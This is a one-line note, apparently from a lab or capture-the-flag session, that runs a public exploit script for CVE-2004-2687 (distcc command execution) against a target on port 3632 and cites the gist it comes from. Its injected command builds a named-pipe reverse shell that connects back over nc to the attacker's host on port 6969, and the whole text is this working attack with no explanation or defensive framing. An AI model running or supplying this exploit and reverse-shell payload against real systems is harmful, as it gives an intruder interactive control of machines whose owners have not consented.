```
python2 CVE-2004-2687.py -t 10.129.37.154 -p 3632 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.133 6969 >/tmp/f'
```
- from https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855
